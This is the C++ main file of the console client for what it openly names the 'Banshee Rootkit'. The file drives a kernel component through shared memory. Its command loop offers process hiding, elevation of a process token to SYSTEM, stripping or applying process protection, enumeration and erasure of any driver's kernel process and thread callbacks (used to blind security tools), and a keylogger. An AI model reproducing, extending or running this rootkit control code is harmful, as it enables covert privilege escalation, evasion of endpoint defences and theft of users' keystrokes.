// Banshee.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Banshee.hpp"
#include "Logger.hpp"
#include <iostream>
#include <string.h>

// cursed macro
#define echo std::cout <<

INT 
main(INT argc, CHAR *argv[])
{
    echo " ______   ______   ______   ______   _    _   ______  ______ \n";
    echo "| |  | \\ | |  | | | |  \\ \\ / |      | |  | | | |     | |     \n";
    echo "| |--| < | |__| | | |  | | '------. | |--| | | |---- | |---- \n";
    echo "|_|__|_/ |_|  |_| |_|  |_|  ____|_/ |_|  |_| |_|____ |_|____ \n\n";
    std::cout << "Banshee Rootkit v0.1.0\n" << std::endl;

    auto banshee = Banshee();

    if (banshee.Initialize() != BE_SUCCESS)
    {
        LogError("Error during initialization: Could not get handle");
        return 3;
    }
    LogInfo("Got handle to shared memory");
    
    // Main Loop

    BOOL shouldExit = false;
    while (!shouldExit)
    {
        BANSHEE_STATUS status = BE_ERR_GENERIC;

        auto choice = AskInput("");
        auto end_pos = std::remove(choice.begin(), choice.end(), ' '); // strip spaces from commands
        choice.erase(end_pos, choice.end());

        if (choice == "help")
        {
            printf("Kill:\n");
            printf("    kill      - kill process by PID\n");
            printf("Process:\n");
            printf("    elevate   - Change a process access token to SYSTEM by PID\n");
            printf("    hide      - Hide a process from task manager etc. by PID\n");
            printf("    unprotect - remove protection from process by PID\n");
            printf("    protect   - apply PS_PROTECTED_SYSTEM protection to process by PID\n");
            printf("Callbacks:\n");
            printf("    callbacks - enumerate kernel callbacks\n");
            printf("    erase_p   - erase process creation kernel callbacks of any driver\n");
            printf("    erase_t   - erase thread creation kernel callbacks of any driver\n");
            printf("Keylogging:\n");
            printf("    keylog         - start keylogger\n");
            printf("    stop_keylog    - stop keylogger\n");
            printf("\n");
            printf("    unload    - unload banshee (restores callbacks)\n");
            printf("    exit      - exit banshee\n");
            continue;
        }
        else if (choice == "exit")
        {
            shouldExit = true;
            continue;
        }
        else if (choice == "kill")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.KillProcess(targetPid);
        }
        else if (choice == "elevate")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.ElevateProcessAccessToken(targetPid);
        }
        else if (choice == "hide")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.HideProcess(targetPid);
        }
        else if (choice == "unprotect")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.ProtectProcess(targetPid, PS_PROTECTED_NONE);
        }
        else if (choice == "protect")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.ProtectProcess(targetPid, PS_PROTECTED_SYSTEM);
        }
        else if (choice == "callbacks")
        {
            // Process callbacks
            auto processCallbackData = std::vector<CALLBACK_DATA>();
            LogInfo("Enumerating process creation callbacks");
            status = banshee.EnumerateCallbacks(CreateProcessNotifyRoutine, processCallbackData);
            if (status != BE_SUCCESS)
            {
                LogError("Banshee Error when enumerating process creation callbacks: " + std::to_string((INT)status));
                continue;
            }
            else
            {
                for (auto e : processCallbackData)
                {
                    printf(":: 0x%llx+0x%llx (%ws)\n", e.driverBase, e.offset, e.driverName);
                }
            }
            
            // Thread callbacks
            auto threadCallbackData = std::vector<CALLBACK_DATA>();
            LogInfo("Enumerating thread creation callbacks");
            status = banshee.EnumerateCallbacks(CreateThreadNotifyRoutine, threadCallbackData);
            if (status != BE_SUCCESS)
            {
                LogError("Banshee Error when enumerating thread creation callbacks: " + std::to_string((INT)status));
                continue;
            }
            else
            {
                for (auto e : threadCallbackData)
                {
                    printf(":: 0x%llx+0x%llx (%ws)\n", e.driverBase, e.offset, e.driverName);
                }
            }
        }
        else if (choice == "erase_p")
        {
            auto targetDriver = AskInputNoPrompt("Target driver module (as printed in callback enumeration): ");

            // strip spaces
            auto end_pos = std::remove(targetDriver.begin(), targetDriver.end(), ' ');
            targetDriver.erase(end_pos, targetDriver.end());

            LogInfo("Attempting to erase process creation callbacks of " + targetDriver);
            status = banshee.EraseCallbacks(targetDriver, CreateProcessNotifyRoutine);
        }
        else if (choice == "erase_t")
        {
            auto targetDriver = AskInputNoPrompt("Target driver module (as printed in callback enumeration): ");

            // strip spaces
            auto end_pos = std::remove(targetDriver.begin(), targetDriver.end(), ' ');
            targetDriver.erase(end_pos, targetDriver.end());

            LogInfo("Attempting to erase thread creation callbacks of " + targetDriver);
            status = banshee.EraseCallbacks(targetDriver, CreateThreadNotifyRoutine);
        }
        else if (choice == "keylog")
        {
            LogInfo("Starting keylogger");
            status = banshee.StartKeylogger(TRUE);
        }
        else if (choice == "stop_keylog")
        {
            LogInfo("Stopping keylogger");
            status = banshee.StartKeylogger(FALSE);
        }
        else if (choice == "unload")
        {
            LogInfo("Unloading Banshee");
            status = banshee.Unload();
        }
        else
        {
            LogError("Invalid choice: " + choice);
            continue;
        }

        if (status != BE_SUCCESS)
        {
            LogError("Banshee Error: " + std::to_string((int)status));
        }
        else
        {
            LogInfo("BE_SUCCESS");
        }
    }

    return 0;
}


